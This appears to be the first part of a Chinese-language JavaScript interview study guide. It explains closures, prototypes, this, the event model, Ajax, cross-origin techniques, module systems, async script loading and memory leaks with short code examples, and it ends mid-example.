---
title: "JavaScript相关 1"
---

# 三、JavaScript相关（1/4）

## 三、JavaScript相关

### 1 闭包

  * 闭包就是能够读取其他函数内部变量的函数

  * 闭包是指有权访问另一个函数作用域中变量的函数，创建闭包的最常见的方式就是在一个函数内创建另一个函数，通过另一个函数访问这个函数的局部变量,利用闭包可以突破作用链域

  * **闭包的特性：**

    * 函数内再嵌套函数
    * 内部函数可以引用外层的参数和变量
    * 参数和变量不会被垃圾回收机制回收

**说说你对闭包的理解**

  * 使用闭包主要是为了设计私有的方法和变量。闭包的优点是可以避免全局变量的污染，缺点是闭包会常驻内存，会增大内存使用量，使用不当很容易造成内存泄露。在js中，函数即闭包，只有函数才会产生作用域的概念

  * 闭包 的最大用处有两个，一个是可以读取函数内部的变量，另一个就是让这些变量始终保持在内存中

  * 闭包的另一个用处，是封装对象的私有属性和私有方法

  * **好处** ：能够实现封装和缓存等；

  * **坏处** ：就是消耗内存、不正当使用会造成内存溢出的问题

**使用闭包的注意点**

  * 由于闭包会使得函数中的变量都被保存在内存中，内存消耗很大，所以不能滥用闭包，否则会造成网页的性能问题，在IE中可能导致内存泄露
  * 解决方法是，在退出函数之前，将不使用的局部变量全部删除

**举出闭包实际场景运用的例子**

  1. 比如常见的防抖节流
```js
    // 防抖
    function debounce(fn, delay = 300) {
      let timer; //闭包引用的外界变量
      return function () {
        const args = arguments;
        if (timer) {
          clearTimeout(timer);
        }
        timer = setTimeout(() => {
          fn.apply(this, args);
        }, delay);
      };
    }
```

  2. 使用闭包可以在 `JavaScript` 中模拟块级作用域
```js
    function outputNumbers(count) {
      (function () {
        for (var i = 0; i < count; i++) {
          alert(i);
        }
      })();
      alert(i); //导致一个错误！
    }
```

  3. 闭包可以用于在对象中创建私有变量
```js
    var aaa = (function () {
      var a = 1;
      function bbb() {
        a++;
        console.log(a);
      }
      function ccc() {
        a++;
        console.log(a);
      }
      return {
        b: bbb, //json结构
        c: ccc,
      };
    })();
    console.log(aaa.a); //undefined
    aaa.b(); //2
    aaa.c(); //3
```

### 2 说说你对作用域链的理解

  * 作用域链是一种用于查找变量和函数的机制，它是由当前执行环境和其所有父级执行环境的变量对象组成的链式结构。当在一个执行环境中访问变量或函数时，会首先在当前执行环境的变量对象中查找，如果找不到，则会沿着作用域链向上查找，直到找到对应的变量或函数，或者达到最外层的全局对象（如`window`）。
  * 作用域链的创建是在函数定义时确定的，它与函数的定义位置有关。当函数被调用时，会创建一个新的执行环境，其中包含一个新的变量对象，并将其添加到作用域链的前端。这样，函数内部就可以访问其所在作用域以及其外部作用域中的变量和函数，形成了一个作用域链。

以下是一个示例，展示了作用域链的工作原理：
```javascript
    function outer() {
      var outerVar = 'Outer variable';
    
      function inner() {
        var innerVar = 'Inner variable';
        console.log(innerVar); // 内部作用域的变量
        console.log(outerVar); // 外部作用域的变量
        console.log(globalVar); // 全局作用域的变量
      }
    
      inner();
    }
    
    var globalVar = 'Global variable';
    outer();
```

在上述示例中，函数`inner()`内部可以访问到其外部函数`outer()`中定义的变量`outerVar`，这是因为`inner()`的作用域链中包含了外部函数的变量对象。同样，`inner()`也可以访问全局作用域中的变量`globalVar`，因为全局作用域也在作用域链中。

通过作用域链的机制，函数可以访问外部作用域中的变量，但外部作用域不能访问函数内部的变量，这就实现了变量的封装和保护。

值得注意的是，当函数执行完毕后，其执行环境会被销毁，对应的变量对象也会被释放，因此作用域链也随之消失。这也是闭包的概念中所提到的保持变量的生命周期的特性。

**总结**

  * 作用域链的作用是保证执行环境里有权访问的变量和函数是有序的，作用域链的变量只能向上访问，变量访问到`window`对象即被终止，作用域链向下访问变量是不被允许的
  * 简单的说，`作用域就是变量与函数的可访问范围`，即作用域控制着变量与函数的可见性和生命周期

### 3 JavaScript原型，原型链 ? 有什么特点？

![原型链：对象通过 __proto__ 逐层向上查找属性，直到 Object.prototype 的 null 为止](/images/diagrams/prototype-chain.webp)

  * 每个对象都会在其内部初始化一个属性，就是`__proto__`，当我们访问一个对象的属性时
  * 如果这个对象内部不存在这个属性，那么他就会去`__proto__`里找这个属性，这个`__proto__`又会有自己的`__proto__`，于是就这样一直找下去，也就是我们平时所说的原型链的概念。按照标准，`__proto__` 是不对外公开的，也就是说是个私有属性
  * 关系：`instance.constructor.prototype == instance.__proto__`
```js
    // eg.
    var a = {}
    
    a.constructor.prototype == a.__proto__
```

  * 特点：

    * `JavaScript`对象是通过引用来传递的，我们创建的每个新对象实体中并没有一份属于自己的原型副本。当我们修改原型时，与之相关的对象也会继承这一改变
  * 当我们需要一个属性的时，`Javascript`引擎会先看当前对象中是否有这个属性， 如果没有的

  * 就会查找他的`Prototype`对象是否有这个属性，如此递推下去，一直检索到 `Object` 内建对象

  * **原型：**

    * `JavaScript`的所有对象中都包含了一个 `[__proto__]` 内部属性，这个属性所对应的就是该对象的原型
    * JavaScript的函数对象，除了原型 `[__proto__]` 之外，还预置了 `prototype` 属性
    * 当函数对象作为构造函数创建实例时，该 prototype 属性值将被作为实例对象的原型 `[__proto__]`。
  * **原型链：**

    * 当一个对象调用的属性/方法自身不存在时，就会去自己 `[__proto__]` 关联的前辈 `prototype` 对象上去找
    * 如果没找到，就会去该 `prototype` 原型 `[__proto__]` 关联的前辈 `prototype` 去找。依次类推，直到找到属性/方法或 `undefined` 为止。从而形成了所谓的“原型链”
  * **原型特点：**

    * `JavaScript`对象是通过引用来传递的，当修改原型时，与之相关的对象也会继承这一改变

### 4 请解释什么是事件代理

  * 事件代理（`Event Delegation`），又称之为事件委托。是 `JavaScript` 中常用绑定事件的常用技巧。顾名思义，“事件代理”即是把原本需要绑定的事件委托给父元素，让父元素担当事件监听的职务。`事件代理的原理是DOM元素的事件冒泡`。使用事件代理的好处是可以提高性能
  * 可以大量节省内存占用，减少事件注册，比如在`table`上代理所有`td`的`click`事件就非常棒
  * 可以实现当新增子对象时无需再次对其绑定

下面是一个简单的事件代理的示例代码：
```html
    <ul id="myList">
      <li>Item 1</li>
      <li>Item 2</li>
      <li>Item 3</li>
    </ul>
```  
```javascript
    // 使用事件代理绑定点击事件
    var myList = document.getElementById('myList');
    myList.addEventListener('click', function(event) {
      if (event.target.tagName === 'LI') {
        console.log('Clicked on:', event.target.textContent);
      }
    });
```

在上述示例中，我们将点击事件绑定到父元素 `myList` 上，当点击子元素 `li` 时，事件会冒泡到父元素，父元素上的事件处理函数会捕获到事件，并根据
`event.target` 来判断点击的具体元素。这样就实现了对子元素点击事件的代理处理。

使用事件代理的优势是可以减少事件处理程序的数量，尤其适用于大量的子元素或动态添加的元素，避免了为每个子元素都绑定事件处理程序的麻烦。同时，对于新增的子元素，无需再次绑定事件，它们会自动继承父元素上的事件处理。

需要注意的是，在事件代理中，我们需要通过 `event.target` 来判断具体触发事件的元素，从而执行相应的逻辑。

### 5 Javascript如何实现继承？

在 JavaScript
中，实现继承的方式有多种，包括`构造继承`、`原型继承`、`实例继承`和`拷贝继承`等。其中，使用`构造函数与原型混合方式是较常用和推荐的方式`。

**以下是使用构造函数与原型混合方式实现继承的示例代码：**
```javascript
    function Parent() {
      this.name = 'poetry';
    }
    
    function Child() {
      this.age = 28;
    }
    
    // 使用构造函数继承
    Child.prototype = new Parent();
    Child.prototype.constructor = Child;
    
    var demo = new Child();
    console.log(demo.age); // 输出: 28
    console.log(demo.name); // 输出: poetry
    console.log(demo.constructor); // 输出: Child
```

通过将 `Child.prototype` 设置为 `new Parent()`，子类 `Child` 继承了父类 `Parent`
的属性和方法。然后，通过手动将 `Child.prototype.constructor` 设置为 `Child`，确保子类的构造函数指向自身。

这样，`demo.constructor` 的输出将是 `Child`，表示 `demo` 实例的构造函数是 `Child`，以确保子类的实例通过
`constructor` 属性可以准确地识别其构造函数。

### 6 谈谈This对象的理解

  * **在全局作用域中** ，`this` 指向全局对象（在浏览器环境中通常是 `window` 对象）。
  * **在函数中** ，`this` 的值取决于函数的调用方式。 
    * 如果函数是作为对象的方法调用，`this` 指向调用该方法的对象。
    * 如果函数是作为普通函数调用，`this` 指向全局对象（非严格模式下）或 `undefined`（严格模式下）。
    * 如果函数是通过 `call`、`apply` 或 `bind` 方法调用，`this` 指向 `call`、`apply` 或 `bind` 方法的第一个参数所指定的对象。
    * 如果函数是作为构造函数调用（使用 `new` 关键字），`this` 指向新创建的对象。
  * **在箭头函数中** ，`this` 的值是继承自外部作用域的，它不会因为调用方式的改变而改变。

下面是一些示例代码，以说明 `this` 的不同情况：
```javascript
    // 全局作用域中的 this
    console.log(this); // 输出: Window
    
    // 对象方法中的 this
    const obj = {
      name: 'poetry',
      sayHello: function() {
        console.log(`Hello, ${this.name}!`);
      }
    };
    obj.sayHello(); // 输出: Hello, poetry!
    
    // 普通函数调用中的 this
    function greeting() {
      console.log(`Hello, ${this.name}!`);
    }
    greeting(); // 输出: Hello, undefined (非严格模式下输出: Hello, [全局对象的某个属性值])
    
    // 使用 call/apply/bind 改变 this
    const person = {
      name: 'poetry'
    };
    greeting.call(person); // 输出: Hello, poetry!
    greeting.apply(person); // 输出: Hello, poetry!
    const boundGreeting = greeting.bind(person);
    boundGreeting(); // 输出: Hello, poetry!
    
    // 构造函数中的 this
    function Person(name) {
      this.name = name;
    }
    const poetry = new Person('poetry');
    console.log(poetry.name); // 输出: poetry
    
    // 箭头函数中的 this
    const arrowFunc = () => {
      console.log(this);
    };
    arrowFunc(); // 输出: Window
```

### 7 事件模型

事件流分为三个阶段：捕获阶段、目标阶段和冒泡阶段。

  1. **捕获阶段（Capture Phase）** ：事件从最外层的父节点开始向下传递，直到达到目标元素的父节点。在捕获阶段，事件会经过父节点、祖父节点等，但不会触发任何事件处理程序。
  2. **目标阶段（Target Phase）** ：事件到达目标元素本身，触发目标元素上的事件处理程序。如果事件有多个处理程序绑定在目标元素上，它们会按照添加的顺序依次执行。
  3. **冒泡阶段（Bubble Phase）** ：事件从目标元素开始向上冒泡，传递到父节点，直到传递到最外层的父节点或根节点。在冒泡阶段，事件会依次触发父节点、祖父节点等的事件处理程序。

事件流的默认顺序是从目标元素的最外层父节点开始的捕获阶段，然后是目标阶段，最后是冒泡阶段。但是可以通过事件处理程序的绑定顺序来改变事件处理的执行顺序。

例如，以下代码演示了事件流的执行顺序：
```html
    <div id="outer">
      <div id="inner">
        <button id="btn">Click me</button>
      </div>
    </div>
```  
```javascript
    var outer = document.getElementById('outer');
    var inner = document.getElementById('inner');
    var btn = document.getElementById('btn');
    
    outer.addEventListener('click', function() {
      console.log('Outer div clicked');
    }, true); // 使用捕获阶段进行事件监听
    
    inner.addEventListener('click', function() {
      console.log('Inner div clicked');
    }, false); // 使用冒泡阶段进行事件监听
    
    btn.addEventListener('click', function() {
      console.log('Button clicked');
    }, false); // 使用冒泡阶段进行事件监听
```

当点击按钮时，事件的执行顺序如下：

  1. 捕获阶段：触发外层div的捕获事件处理程序。
  2. 目标阶段：触发按钮的事件处理程序。
  3. 冒泡阶段：触发内层div的冒泡事件处理程序。

输出结果为：
```javascript
    Outer div clicked
    Button clicked
    Inner div clicked
```

这个示例展示了事件流中捕获阶段、目标阶段和冒泡阶段的执行顺序。

>
> 可以通过`addEventListener`方法的第三个参数来控制事件处理函数在捕获阶段或冒泡阶段执行，`true`表示捕获阶段，`false`或不传表示冒泡阶段。

### 8 new操作符具体干了什么呢?

  * 创建一个空对象，并且 `this` 变量引用该对象，同时还继承了该函数的原型
  * 属性和方法被加入到 `this` 引用的对象中
  * 新创建的对象由 `this` 所引用，并且最后隐式的返回 `this`

**实现一个简单的`new` 方法，可以按照以下步骤进行操作：**

  1. 创建一个新的空对象。
  2. 将新对象的原型链接到构造函数的原型对象。
  3. 将构造函数的作用域赋给新对象，以便在构造函数中使用 `this` 引用新对象。
  4. 执行构造函数，并将参数传递给构造函数。
  5. 如果构造函数没有显式返回一个对象，则返回新对象。
```javascript
    function myNew(constructor, ...args) {
      // 创建一个新的空对象
      const newObj = {};
    
      // 将新对象的原型链接到构造函数的原型对象
      Object.setPrototypeOf(newObj, constructor.prototype);
    
      // 将构造函数的作用域赋给新对象，并执行构造函数
      const result = constructor.apply(newObj, args);
    
      // 如果构造函数有显式返回一个对象，则返回该对象；否则返回新对象
      return typeof result === 'object' && result !== null ? result : newObj;
    }
```

使用上述自定义的 `myNew` 方法，可以实现与 `new` 操作符类似的效果，如下所示：
```javascript
    function Person(name, age) {
      this.name = name;
      this.age = age;
    }
    
    Person.prototype.sayHello = function() {
      console.log('Hello, my name is ' + this.name);
    };
    
    var poetry = myNew(Person, 'poetry', 25);
    console.log(poetry.name); // 输出: poetry
    console.log(poetry.age); // 输出: 25
    poetry.sayHello(); // 输出: Hello, my name is poetry
```

注意，这只是一个简化的实现，不考虑一些复杂的情况，例如原型链的继承和构造函数返回对象的情况。在实际应用中，建议使用内置的 `new`
操作符来创建对象实例，因为它处理了更多的细节和边界情况。

### 9 Ajax原理

  * `Ajax`的原理简单来说是在用户和服务器之间加了—个中间层(`AJAX`引擎)，通过`XmlHttpRequest`对象来向服务器发异步请求，从服务器获得数据，然后用`javascript`来操作`DOM`而更新页面。使用户操作与服务器响应异步化。这其中最关键的一步就是从服务器获得请求数据
  * `Ajax`的过程只涉及`JavaScript`、`XMLHttpRequest`和`DOM`。`XMLHttpRequest`是`ajax`的核心机制
```js
    // 手写简易ajax
    /** 1. 创建连接 **/
    var xhr = null;
    xhr = new XMLHttpRequest()
    /** 2. 连接服务器 **/
    xhr.open('get', url, true)
    /** 3. 发送请求 **/
    xhr.send(null);
    /** 4. 接受请求 **/
    xhr.onreadystatechange = function(){
    	if(xhr.readyState == 4){
    		if(xhr.status == 200){
    			success(xhr.responseText);
    		} else { 
    			/** false **/
    			fail && fail(xhr.status);
    		}
    	}
    }
```  
```js
    // promise封装
    function ajax(url) {
      const p = new Promise((resolve, reject) => {
        const xhr = new XMLHttpRequest()
        xhr.open('GET', url, true)
        xhr.onreadystatechange = function () {
          if (xhr.readyState === 4) {
            if (xhr.status === 200) {
              resolve(
                JSON.parse(xhr.responseText)
              )
            } else if (xhr.status === 404 || xhr.status === 500) {
              reject(new Error('404 not found'))
            }
          }
        }
        xhr.send(null)
      })
      return p
    }
```  
```js
    // 测试
    const url = '/data/test.json'
    ajax(url)
      .then(res => console.log(res))
      .catch(err => console.error(err))
```

**ajax 有那些优缺点?**

  * 优点： 
    * 通过异步模式，提升了用户体验.
    * 优化了浏览器和服务器之间的传输，减少不必要的数据往返，减少了带宽占用.
    * `Ajax`在客户端运行，承担了一部分本来由服务器承担的工作，减少了大用户量下的服务器负载。
    * `Ajax`可以实现动态不刷新（局部刷新）
  * 缺点： 
    * 安全问题 `AJAX`暴露了与服务器交互的细节。
    * 对搜索引擎的支持比较弱。
    * 不容易调试。

> 补充（现代做法）：实际开发中已极少手写 `XMLHttpRequest`。优先用浏览器原生的 `fetch`（返回 Promise，配合 `async/await`），或第三方库 `axios`（自带拦截器、自动 JSON 解析、超时与取消、统一错误处理）。需要注意：`fetch` 默认不会在 4xx/5xx 时 reject，需自行检查 `res.ok`；取消请求用 `AbortController`；超时也借助 `AbortController` 实现。
>
> ```js
> // fetch + async/await
> async function getData(url) {
>   const controller = new AbortController()
>   const timer = setTimeout(() => controller.abort(), 5000) // 超时控制
>   try {
>     const res = await fetch(url, { signal: controller.signal })
>     if (!res.ok) throw new Error(`HTTP ${res.status}`) // fetch 需手动判错
>     return await res.json()
>   } finally {
>     clearTimeout(timer)
>   }
> }
> ```

### 10 如何解决跨域问题?

> 首先了解下浏览器的同源策略 同源策略`/SOP（Same origin
> policy）`是一种约定，由Netscape公司1995年引入浏览器，它是浏览器最核心也最基本的安全功能，如果缺少了同源策略，浏览器很容易受到`XSS`、`CSRF`等攻击。所谓同源是指"**协议+域名+端口**
> "三者相同，即便两个不同的域名指向同一个ip地址，也非同源

**1\. 通过jsonp跨域**

封装一个可用的 JSONP 方法，可以参考以下示例代码：
```javascript
    function jsonp(url, params, callback) {
      // 生成唯一的回调函数名
      const callbackName = 'jsonp_' + Date.now();
    
      // 将参数拼接到 URL 中
      const queryString = Object.keys(params)
        .map(key => encodeURIComponent(key) + '=' + encodeURIComponent(params[key]))
        .join('&');
    
      // 创建 script 元素
      const script = document.createElement('script');
      script.src = url + '?' + queryString + '&callback=' + callbackName;
    
      // 定义回调函数
      window[callbackName] = function(data) {
        // 调用回调函数
        callback(data);
    
        // 删除 script 元素和回调函数
        document.head.removeChild(script);
        delete window[callbackName];
      };
    
      // 将 script 元素添加到页面中
      document.head.appendChild(script);
    }
```

使用示例：
```javascript
    jsonp('http://www.example.com/api', { user: 'admin' }, function(data) {
      console.log(data);
    });
```

这个 `jsonp` 函数接受三个参数：URL、参数对象和回调函数。它会生成一个唯一的回调函数名，并将参数拼接到 URL 中。然后创建一个
`<script>` 元素，并将 URL 设置为带有回调函数名的 URL。定义一个全局的回调函数，当响应返回时调用该回调函数，并将数据传递给回调函数。最后将
`<script>` 元素添加到页面中，触发跨域请求。当请求完成后，删除 `<script>` 元素和回调函数。

这样，你就可以通过封装的 JSONP 方法来实现跨域请求并获取响应数据了。

**2\. document.domain + iframe跨域**

> 自 `Chrome 101` 版本开始，`document.domain` 将变为可读属性，也就是意味着上述这种跨域的方式被禁用了

> 此方案仅限主域相同，子域不同的跨域应用场景

1.）父窗口：(http://www.domain.com/a.html)
```html
    <iframe id="iframe" src="http://child.domain.com/b.html"></iframe>
    <script>
        document.domain = 'domain.com';
        var user = 'admin';
    </script>
```

2.）子窗口：(http://child.domain.com/b.html)
```javascript
    document.domain = 'domain.com';
    // 获取父窗口中的变量
    alert('get js data from parent ---> ' + window.parent.user);
```

**3\. nginx代理跨域**

通过 Nginx 配置反向代理，将跨域请求转发到同源接口，从而避免浏览器的同源策略限制。

下面是一个示例配置，展示了如何通过 Nginx 实现跨域代理：
```nginx
    server {
      listen 80;
      server_name your-domain.com;
    
      location /api {
        # 设置代理目标地址
        proxy_pass http://api.example.com;
        
        # 设置允许的跨域请求头
        add_header Access-Control-Allow-Origin $http_origin;
        add_header Access-Control-Allow-Methods "GET, POST, OPTIONS";
        add_header Access-Control-Allow-Credentials true;
        add_header Access-Control-Allow-Headers "Origin, X-Requested-With, Content-Type, Accept";
        
        # 处理预检请求（OPTIONS 请求）
        if ($request_method = OPTIONS) {
          return 200;
        }
      }
    }
```

在上面的示例中，假设你的域名是 `your-domain.com`，需要代理访问 `api.example.com`。你可以将这个配置添加到 Nginx
的配置文件中。

这个配置会将 `/api` 路径下的请求代理到 `http://api.example.com`。同时，通过添加 `Access-Control-
Allow-*` 头部，允许跨域请求的来源、方法、头部等。

这样，当你在前端发送请求到 `/api` 路径时，Nginx 会将请求代理到
`http://api.example.com`，并在响应中添加跨域相关的头部，从而解决跨域问题。注意要根据实际情况进行配置，包括监听的端口、域名和代理的目标地址等。

**4\. nodejs中间件代理跨域**

使用 Node.js 构建一个中间件，在服务器端代理请求，将跨域请求转发到同源接口，然后将响应返回给前端。

可以使用 `http-proxy-middleware` 模块来创建一个简单的代理服务器。下面是一个示例代码：
```javascript
    const express = require('express');
    const { createProxyMiddleware } = require('http-proxy-middleware');
    
    const app = express();
    
    // 创建代理中间件
    const apiProxy = createProxyMiddleware('/api', {
      target: 'http://api.example.com', // 设置代理目标地址
      changeOrigin: true, // 修改请求头中的 Origin 为目标地址
      pathRewrite: {
        '^/api': '', // 重写请求路径，去掉 '/api' 前缀
      },
      // 可选的其他配置项...
    });
    
    // 将代理中间件应用到 '/api' 路径
    app.use('/api', apiProxy);
    
    // 启动服务器
    app.listen(3000, () => {
      console.log('Proxy server is running on port 3000');
    });
```

在上面的示例中，首先使用 `express` 框架创建一个服务器实例。然后，使用 `http-proxy-middleware`
模块创建一个代理中间件。通过配置代理中间件的 `target` 选项，将请求代理到目标地址 `http://api.example.com`。

你可以通过其他可选的配置项来进行更多的定制，例如修改请求头、重写请求路径等。在这个示例中，我们将代理中间件应用到路径 `/api` 下，即当请求路径以
`/api` 开头时，会被代理到目标地址。

最后，启动服务器并监听指定的端口（这里是 3000）。

请确保你已经安装了 `express` 和 `http-proxy-middleware` 模块，并将上述代码保存为一个文件（例如 `proxy-
server.js`）。然后通过运行 `node proxy-server.js` 来启动代理服务器。

现在，当你在前端发送请求到 `/api` 路径时，Node.js 代理服务器会将请求转发到
`http://api.example.com`，从而实现跨域访问。记得根据实际情况修改目标地址和端口号。

**5\. 后端在头部信息里面设置安全域名**

后端可以在响应的头部信息中设置 `Access-Control-Allow-Origin` 字段，指定允许跨域访问的域名。例如，在 `Node.js`
中可以使用 `cors` 模块来实现：
```js
    const express = require('express');
    const cors = require('cors');
    
    const app = express();
    
    // 允许所有域名跨域访问
    app.use(cors());
    
    // 其他路由和逻辑处理...
    
    app.listen(3000, () => {
      console.log('Server is running on port 3000');
    });
```

**6\. 通过webpack devserver代理**

使用 `webpack-dev-server` 的代理功能可以实现在开发过程中的跨域请求。你可以配置 `devServer` 对象中的 `proxy`
选项来设置代理。下面是一个示例配置：
```javascript
    module.exports = {
      // 其他配置项...
      devServer: {
        proxy: {
          '/api': {
            target: 'http://api.example.com', // 设置代理目标地址
            pathRewrite: { '^/api': '' }, // 重写请求路径，去掉 '/api' 前缀
            changeOrigin: true, // 修改请求头中的 Origin 为目标地址
          },
        },
      },
    };
```

在上面的示例中，我们配置了一个代理，将以 `/api` 开头的请求转发到 `http://api.example.com`。通过 `pathRewrite`
选项，我们去掉了请求路径中的 `/api` 前缀，以符合目标地址的接口路径。

将上述配置添加到你的 `webpack.config.js` 文件中，然后启动 `webpack-dev-server`。现在，当你在前端发送以
`/api` 开头的请求时，`webpack-dev-server` 会将请求转发到目标地址，并返回响应结果。

注意，这里的配置是针对开发环境下的代理，当你构建生产环境的代码时，代理配置不会生效。

请确保你已经安装了 `webpack-dev-server`，并在你的 `package.json` 文件的 `scripts` 中添加启动命令，例如：
```json
    {
      "scripts": {
        "start": "webpack-dev-server --open"
      }
    }
```

运行 `npm start` 或 `yarn start` 来启动 `webpack-dev-server`。

这样，通过配置 `webpack-dev-server` 的代理，你就可以在开发过程中实现跨域请求。记得根据实际情况修改目标地址和请求路径。

**7\. CORS（跨域资源共享）**

在服务端设置响应头部，允许特定的域名或所有域名访问该资源。可以通过在响应头部中设置 `Access-Control-Allow-Origin`
字段来指定允许访问的域名。

示例代码（`Node.js` \+ `Express`）：
```javascript
    const express = require('express');
    const app = express();
    
    // 允许所有域名访问
    app.use((req, res, next) => {
      res.setHeader('Access-Control-Allow-Origin', '*');
      next();
    });
    
    // 路由和处理逻辑
    // ...
    
    app.listen(3000, () => {
      console.log('Server is running on port 3000');
    });
```

**8\. WebSocket**

使用 WebSocket 协议进行通信，WebSocket 不受同源策略限制，因此可以在不同域之间进行双向通信。

示例代码（JavaScript）：
```javascript
    const socket = new WebSocket('ws://example.com/socket');
    
    socket.onopen = () => {
      console.log('WebSocket connection established.');
      // 发送数据
      socket.send('Hello, server!');
    };
    
    socket.onmessage = (event) => {
      console.log('Received message from server:', event.data);
    };
    
    socket.onclose = () => {
      console.log('WebSocket connection closed.');
    };
```

**9\. 代理服务器**

在同一域名下，前端通过发送请求给同域下的代理服务器，然后由代理服务器转发请求到目标服务器，并将响应返回给前端，实现跨域请求。

示例代码（Node.js + Express）：
```javascript
    const express = require('express');
    const axios = require('axios');
    const app = express();
    
    app.get('/api/data', (req, res) => {
      // 向目标服务器发送请求
      axios.get('http://api.example.com/data')
        .then((response) => {
          // 将目标服务器的响应返回给前端
          res.json(response.data);
        })
        .catch((error) => {
          res.status(500).json({ error: 'An error occurred' });
        });
    });
    
    app.listen(3000, () => {
      console.log('Server is running on port 3000');
    });
```

### 11 模块化开发怎么做？

当涉及模块化开发时，有多种方法可供选择：

**1\. 立即执行函数模式：**

  * 使用立即执行函数来创建模块，将私有成员放在函数作用域内，不直接暴露给外部。
  * 通过返回一个包含公共方法的对象，使这些方法可以在外部访问。
```javascript
    var module = (function() {
      var privateVar = 'Private Variable';
    
      function privateMethod() {
        console.log('This is a private method');
      }
    
      function publicMethod() {
        console.log('This is a public method');
      }
    
      return {
        publicMethod: publicMethod
      };
    })();
    
    module.publicMethod(); // Output: This is a public method
```

**2\. CommonJS：**

  * 使用 `require` 导入模块，使用 `module.exports` 或 `exports` 导出模块。
  * 适用于 Node.js 环境。
```javascript
    // math.js
    function add(a, b) {
      return a + b;
    }
    
    function subtract(a, b) {
      return a - b;
    }
    
    module.exports = {
      add,
      subtract
    };
```  
```javascript
    // app.js
    const math = require('./math');
    
    console.log(math.add(2, 3)); // Output: 5
    console.log(math.subtract(5, 2)); // Output: 3
```

**3\. ES Modules：**

  * 使用 `import` 导入模块，使用 `export` 导出模块。
  * 适用于现代浏览器环境和支持 ES6 模块的工具链。
```javascript
    // math.js
    export function add(a, b) {
      return a + b;
    }
    
    export function subtract(a, b) {
      return a - b;
    }
```  
```javascript
    // app.js
    import { add, subtract } from './math';
    
    console.log(add(2, 3)); // Output: 5
    console.log(subtract(5, 2)); // Output: 3
```

**4\. AMD（Asynchronous Module Definition）：**

  * 使用 `define` 定义模块，通过异步加载模块。
  * 适用于浏览器环境和需要按需加载模块的场景。
```javascript
    // math.js
    define([], function() {
      function add(a, b) {
        return a + b;
      }
    
      function subtract(a, b) {
        return a - b;
      }
    
      return {
        add,
        subtract
      };
    });
```  
```javascript
    // app.js
    require(['math'], function(math) {
      console.log(math.add(2, 3)); // Output: 5
      console.log(math.subtract(5, 2)); // Output: 3
    });
```

以上是常见的模块化开发方式，每种方式都有自己的特点和使用场景，可以根据具体需求选择适合的模块化规范。

### 12 异步加载JS的方式有哪些？

你提到的异步加载 JS 的方式都是常见且有效的方法。以下是对每种方式的简要介绍：

**1\. 设置`<script>`属性 `async="async"`：**

  * 通过将`async`属性设置为`"async"`，脚本将异步加载并立即执行，不会阻塞页面的解析和渲染。
  * 脚本加载完成后，将在页面中的任何位置立即执行。
```html
    <script src="script.js" async="async"></script>
```

**2\. 动态创建`script DOM`：**

  * 使用 JavaScript 动态创建 `<script>` 元素，并将其添加到文档中。
  * 通过设置 `src` 属性指定脚本的 URL，异步加载脚本。
```javascript
    var script = document.createElement('script');
    script.src = 'script.js';
    document.head.appendChild(script);
```

**3.`XmlHttpRequest` 脚本注入：**

  * 使用 `XmlHttpRequest` 对象加载脚本内容，并将其注入到页面中。
  * 通过异步请求获取脚本内容后，使用 `eval()` 函数执行脚本。
```javascript
    var xhr = new XMLHttpRequest();
    xhr.open('GET', 'script.js', true);
    xhr.onreadystatechange = function() {
     if (xhr.readyState === 4 && xhr.status === 200) {
       eval(xhr.responseText);
     }
    };
    xhr.send();
```

**4\. 异步加载库`LABjs`：**

  * `LABjs` 是一个用于异步加载 JavaScript 的库，可以管理和控制加载顺序。
  * 它提供了简洁的 API 来定义和加载依赖关系，以及控制脚本加载的时机。
```javascript
    $LAB
     .script('script1.js')
     .wait()
     .script('script2.js');
```

**5\. 模块加载器`Sea.js`：**

  * `Sea.js` 是一个用于 Web 端模块化开发的加载器，可以异步加载和管理模块依赖关系。
  * 它支持异步加载 JavaScript 模块，并在模块加载完成后执行回调函数。
```javascript
    seajs.use(['module1', 'module2'], function(module1, module2) {
     // 执行依赖模块加载完成后的逻辑
    });
```

**6\. Deferred Scripts（延迟脚本）：**

  * 使用 `<script>` 元素的 `defer` 属性可以将脚本延迟到文档解析完成后再执行。
  * 延迟脚本会按照它们在文档中出现的顺序执行，但在 `DOMContentLoaded` 事件触发之前执行。
```html
    <script src="script.js" defer></script>
```

**7\. Dynamic Import（动态导入）：**

  * 使用动态导入语法 `import()` 可以异步加载 JavaScript 模块。
  * 这种方式返回一个 Promise 对象，可以通过 `then()` 方法处理模块加载完成后的逻辑。
```javascript
    import('module.js')
     .then(module => {
       // 执行模块加载完成后的逻辑
     })
     .catch(error => {
       // 处理加载失败的情况
     });
```

**8\. Web Workers（Web 工作者）：**

  * `Web Workers` 是运行在后台线程中的 JavaScript 脚本，可以进行耗时操作而不会阻塞主线程。
  * 可以使用 `Web Workers` 异步加载和执行 JavaScript 脚本，以提高页面的响应性。
```javascript
    var worker = new Worker('worker.js');
    worker.onmessage = function(event) {
     // 处理从 Worker 返回的消息
    };
    worker.postMessage('start');
```

### 13 那些操作会造成内存泄漏？

> JavaScript 内存泄露指对象在不需要使用它时仍然存在，导致占用的内存不能使用或回收

  * 未使用 `var` 声明的全局变量
  * 闭包函数(`Closures`)
  * 循环引用(两个对象相互引用)
  * 控制台日志(`console.log`)
  * 移除存在绑定事件的`DOM`元素(`IE`)
  * `setTimeout` 的第一个参数使用字符串而非函数的话，会引发内存泄漏
  * 垃圾回收器定期扫描对象，并计算引用了每个对象的其他对象的数量。如果一个对象的引用数量为 `0`（没有其他对象引用过该对象），或对该对象的惟一引用是循环的，那么该对象的内存即可回收

下面是一些常见操作可能导致内存泄漏的示例代码：

  1. 未使用 `var` 声明的全局变量：
```javascript
    function foo() {
      bar = 'global variable'; // 没有使用 var 声明
    }
    foo();
```

  2. 闭包函数（Closures）：
```javascript
    function outer() {
      var data = 'sensitive data';
      return function() {
        // 内部函数形成了闭包
        console.log(data);
      };
    }
    var inner = outer();
    inner(); // 闭包引用了外部函数的变量，导致变量无法被释放
```

  3. 循环引用：
```javascript
    function createObjects() {
      var obj1 = {};
      var obj2 = {};
      obj1.ref = obj2;
      obj2.ref = obj1;
      // 对象之间形成循环引用，导致无法被垃圾回收
    }
    createObjects();
```

  4. 控制台日志（`console.log`）：
```javascript
    function processData(data) {
      console.log(data); // 控制台日志可能会引用数据，阻止垃圾回收
      // 处理数据的逻辑
    }
```

  5. 移除存在绑定事件的 DOM 元素（`IE`）：
```javascript
    var element = document.getElementById('myElement');
    element.onclick = function() {
      // 处理点击事件
    };
